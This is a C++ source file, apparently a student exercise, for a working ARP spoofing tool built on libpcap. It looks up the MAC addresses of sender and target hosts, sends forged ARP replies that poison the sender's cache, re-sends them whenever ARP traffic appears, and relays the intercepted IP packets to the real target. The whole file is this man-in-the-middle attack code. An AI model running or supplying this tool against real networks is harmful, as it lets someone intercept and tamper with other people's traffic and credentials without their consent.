﻿#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>
#include <headers.h>

using namespace std;

void usage() {

  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");

}

void get_mymac(char* my_mac, char* iface){

    int fd;
    struct ifreq ifr;
    char *mac;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)ifr.ifr_name , (const char *)iface , IFNAMSIZ-1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);

    mac = (char *)ifr.ifr_hwaddr.sa_data;

    for(int i=0; i<6; i++) my_mac[i] = mac[i];
}

bool chck_snd_to_tgt(const u_char* packet, sess sess){
    struct eth_h eth;
    struct ip_h ip;
    int type;

    memcpy(&eth, packet, 14);
    memcpy(&ip, packet+14, 20);
    type = (eth.type[0]<<8 | eth.type[1]);
    if(type == 0x0800) {
    if(!memcmp(eth.src_mac, sess.snd_mac, 6) && !memcmp(eth.dst_mac, sess.tgt_mac, 6)) return true;
    }
    return false;
}

void rnd_pckt(const u_char* p, uint8_t* my_mac, sess sess){

    struct ip_pckt* pckt = (ip_pckt*)p;
    memcpy(pckt->eth.src_mac, my_mac, 6);
    memcpy(pckt->eth.dst_mac, sess.tgt_mac, 6);

}

bool chck_arp_reply(const u_char* packet, uint8_t* my_mac){
    struct arp_pckt arp_p;
    int type;

    memcpy(&arp_p, packet, 42);
    type = (arp_p.eth.type[0]<<8 | arp_p.eth.type[1]);
    if(type == 0x0806) {
    if(!memcmp(arp_p.eth.dst_mac, my_mac, 6)) return true;
    }
    return false;

}

void ext_mac(const u_char* packet, uint8_t* tgt_mac){

    struct arp_h arp;
    memcpy(&arp, &packet[14], 28);
    for (int i=0; i<6; i++) tgt_mac[i] = arp.snd_mac[i];

}

void get_mac(pcap_t* handle, uint8_t* snd_mac, uint8_t* tgt_mac, uint8_t* tgt_ip){
    struct arp_pckt arp_p;
    memcpy(arp_p.eth.src_mac, snd_mac, 6);
    memcpy(arp_p.eth.dst_mac, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(arp_p.eth.type, "\x08\x06", 2);
    memcpy(arp_p.arp.hd_type, "\x00\x01", 2);
    memcpy(arp_p.arp.pr_type, "\x08\x00", 2);
    arp_p.arp.hd_len = '\x06';
    arp_p.arp.pr_len = '\x04';
    memcpy(arp_p.arp.opcode, "\x00\x01", 2);
    memcpy(arp_p.arp.snd_mac, snd_mac, 6);
    memcpy(arp_p.arp.snd_ip, "\xab\xcd\xef\x12", 4);
    memcpy(arp_p.arp.tgt_mac, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(arp_p.arp.tgt_ip, tgt_ip, 4);

        if(!pcap_sendpacket(handle, (const u_char*)&arp_p, 60))
            printf("waiting\n");
        else
            fprintf(stderr, "send packet error!\n");
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);
        if(chck_arp_reply(packet, snd_mac)){
            ext_mac(packet, tgt_mac);
            break;
        }
        pcap_sendpacket(handle, (const u_char*)&arp_p, 60);
    }
}


void print_mac(uint8_t* mac){

    printf("MAC Address : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

}

void snd_rply (pcap_t* handle, uint8_t* snd_mac, uint8_t* snd_ip, uint8_t* tgt_mac, uint8_t* tgt_ip){

    struct arp_pckt arp_p;

    memcpy(arp_p.eth.dst_mac, tgt_mac, 6);
    memcpy(arp_p.eth.src_mac, snd_mac, 6);
    memcpy(arp_p.eth.type, "\x08\x06", 2);
    memcpy(arp_p.arp.hd_type, "\x00\x01", 2);
    memcpy(arp_p.arp.pr_type, "\x08\x00", 2);
    arp_p.arp.hd_len = '\x06';
    arp_p.arp.pr_len = '\x04';
    memcpy(arp_p.arp.opcode, "\x00\x02", 2);
    memcpy(arp_p.arp.snd_mac, snd_mac, 6);
    memcpy(arp_p.arp.snd_ip, snd_ip, 4);
    memcpy(arp_p.arp.tgt_mac, tgt_mac, 6);
    memcpy(arp_p.arp.tgt_ip, tgt_ip, 4);

    pcap_sendpacket(handle, (const u_char*)&arp_p, 60);
}

bool chck_arp(const u_char* packet, uint8_t* my_mac){

    int type;
    struct eth_h eth;
    memcpy(&eth, packet, 14);
    type = (eth.type[0]<<8 | eth.type[1]);
    if(type == 0x0806) {
    if(!memcmp(eth.dst_mac, my_mac, 6) || !memcmp(eth.dst_mac, "\xff\xff\xff\xff\xff\xff", 6)) return true;

    }
    return false;
}


int main(int argc, char* argv[]) {

    if (argc < 4 ){
        printf("==================================================\n");
        printf("<<<<<<<<<<<<<<<<<<Out of arguments.>>>>>>>>>>>>>>>\n");
        printf("Check out your arguments again.\n");
        printf("./[program name] [dev] [sender_ip] [target_ip]\n");
        return -1;
    }

    if( (argc-2)%2 != 0){

        printf("==================================================\n");
        printf("Check that session arguments exists. ex) sender_ip or target_ip \n");
        printf("./[program name] [dev] [sender_ip] [target_ip] ... [sender_ip] [target_ip]\n");
        return -1;
    }

    uint8_t my_mac[6];
        get_mymac((char*)my_mac, argv[1]);
        printf("==================================================\n");
        printf("My ");
        print_mac(my_mac);
        printf("==================================================\n");


        char* dev = argv[1];
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
          fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
          return -1;
        }

        int sess_num = (argc-2)/2;
        sess* sess_s = new sess[sess_num];

        for (int i=0; i<sess_num; i++){
            inet_aton(argv[2+2*i], (in_addr*)sess_s[i].snd_ip);
            get_mac(handle, my_mac, sess_s[i].snd_mac, sess_s[i].snd_ip);
            printf("%dth sender ", i);
            print_mac(sess_s[i].snd_mac);
            inet_aton(argv[3+2*i], (in_addr*)sess_s[i].tgt_ip);
            get_mac(handle, my_mac, sess_s[i].tgt_mac, sess_s[i].tgt_ip);
            printf("%dth target ", i);
            print_mac(sess_s[i].tgt_mac);
        }

        for (int i=0; i<sess_num; i++) {
            snd_rply(handle, my_mac, sess_s[i].tgt_ip, sess_s[i].snd_mac, sess_s[i].snd_ip);
            printf("sess_num %d\n",i);
        }

        while (true) {

            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            printf("%u bytes captured\n", header->caplen);
            for (int i=0; i<sess_num; i++){
                       if(chck_arp(packet, sess_s[i].snd_mac)){
                           snd_rply(handle, my_mac, sess_s[i].tgt_ip, sess_s[i].snd_mac, sess_s[i].snd_ip);
                           continue;
                       }
               }

           for (int i=0; i<sess_num; i++){
               if(chck_snd_to_tgt(packet, sess_s[i])){
                   rnd_pckt(packet, my_mac, sess_s[i]);
               pcap_sendpacket(handle, packet, header->caplen);
               }
           }
       }
  return 0;
}
